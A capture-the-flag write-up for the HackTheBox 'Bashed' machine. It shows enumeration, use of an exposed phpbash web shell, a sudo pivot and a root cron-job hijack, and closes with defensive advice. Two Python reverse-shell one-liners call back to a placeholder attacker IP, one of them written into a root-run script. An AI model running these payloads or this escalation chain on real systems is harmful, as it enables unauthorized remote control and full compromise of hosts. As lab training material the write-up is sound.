# HackTheBox: Bashed Writeup
A comprehensive, professional walkthrough detailing the exploitation of an exposed web development directory, followed by a multi-stage local privilege escalation chain leveraging user impersonation and automated root task hijacking.

---

## Technical Overview
* **Target OS:** Linux
* **IP Address:** `10.10.10.68`
* **Difficulty:** Easy
* **Core Vulnerabilities:** Exposed Developer Tools (`/dev/` / phpbash) & Insecure Cron Job File Permissions (Python Execution)
* **Objective:** Establish an interactive reverse shell, pivot to a script manager context, and exploit automated tasks to gain full root access.

---

## 1. Enumeration & Reconnaissance

The engagement begins with a rapid, full-port TCP SYN scan targeting only open ports (`--open`) while disabling host discovery (`-Pn`) and DNS resolution (`-n`) to map out the external attack surface efficiently.

```bash
nmap -Pn -n -sS -p- --open --min-rate 5000 10.10.10.68

```

### Targeted Service & Vulnerability Profiling

The initial sweep reveals that only HTTP services are exposed. We conduct a secondary targeted scan over the open port to execute aggressive service versioning (`-sCV`) and script-based vulnerability auditing:

```bash
nmap -sCV -p80 --script="safe and vuln" 10.10.10.68

```

* **Finding:** No critical CVEs or high-risk vulnerabilities are immediately detected through the automated NSE scripts, necessitating a deeper directory enumeration phase.

---

## 2. Directory Fuzzing & Web Enumeration

To uncover hidden resources or unlinked endpoints on the web server, we initiate directory brute-forcing using `gobuster` along with the standard SecLists discovery wordlist:

```bash
gobuster dir -u [http://10.10.10.68/](http://10.10.10.68/) -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

```

### Critical Finding: Exposed Development Environment

The fuzzing results reveal an unindexed **`/dev/`** directory. Upon manual inspection, this directory exposes active PHP development utilities—specifically a web-based interactive terminal profile (`phpbash.php`). This tool allows unauthenticated arbitrary command execution directly through the web browser under the context of the web server daemon.

---

## 3. Initial Foothold & Interactive Shell

To transition from a volatile web-shell interface to an interactive system session, we prepare a local Netcat listener on our attack platform:

```bash
nc -lvnp <YOUR_PORT_1>

```

Within the web-based terminal interface, we execute a standalone Python 3 reverse shell payload to force a socket callback over TCP:

```python
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_TUN0_IP>",<YOUR_PORT_1>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

```

Upon successful connection, we stabilize the shell and verify our execution context:

```bash
$ whoami
www-data

```

---

## 4. Lateral Movement & User Pivoting

With a low-privilege foothold established, we audit our local restrictions by checking the current `sudo` privileges available to the `www-data` account:

```bash
sudo -l

```

### Sudo Permissions Audit

The configuration highlights a specific misconfiguration allowing user impersonation without a password:

```text
User www-data may run the following commands on bashed:
    (scriptmanager) NOPASSWD: ALL

```

We exploit this privilege mapping to drop seamlessly into the security context of the **`scriptmanager`** user:

```bash
sudo -u scriptmanager /bin/bash

```

Now acting as `scriptmanager`, we navigate to the local user directories to exfiltrate the initial compromise proof:

```bash
cd /home/arrexel
cat user.txt

```

---

## 5. Privilege Escalation to Root

### Automated Task Auditing

During post-exploitation enumeration, we inspect the root file structure and discover an unusual directory called `/scripts` located at the system root. We analyze its structure and permissions:

```bash
cd /scripts
ls -la

```

* **Observation:** The directory contains a Python script named `test.py` owned by `scriptmanager`, which automatically pipes data into a text file named `test.txt`. Crucially, `test.txt` is owned by `root`.
* **Conclusion:** This behavior confirms the existence of an automated system task (Cron Job) running periodically as `root` that executes any code contained inside `test.py`.

### Hijacking the Cron Job

Since our current user (`scriptmanager`) has full write permissions over `test.py`, we can hijack its execution flow. We prepare a secondary Netcat listener on our attack host:

```bash
nc -lvnp <YOUR_PORT_2>

```

We overwrite `test.py` with a malicious Python reverse shell script designed to execute when the root cron job fires next:

```bash
echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_TUN0_IP>",<YOUR_PORT_2>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' > test.py

```

### Ultimate Victory

When the automated scheduler executes the modified script, we capture a callback on our second listener, granting us supreme administrative capabilities:

```bash
# whoami
root

# cat /root/root.txt

```

---

## Key Takeaways & Defensive Recommendations

1. **Never Expose Dev Tools in Production:** Directories like `/dev/`, containing administrative scripts or web shells (like `phpbash`), must never be reachable on production web servers. Ensure robust strict access control lists (ACLs) or completely purge development artifacts before deployment.
2. **Secure the Automation Pipeline:** Scripts executed by high-privileged cron jobs or automated system tasks should never be writable by lower-privileged users or group owners. Enforce strict `chown root:root` configurations on all automated execution assets.
3. **Restrict Sudo Impersonation Scope:** Granting `NOPASSWD: ALL` for a service account over another user creates wide security blind spots. Sudo permissions should be severely limited to specific commands rather than broad user context changes.

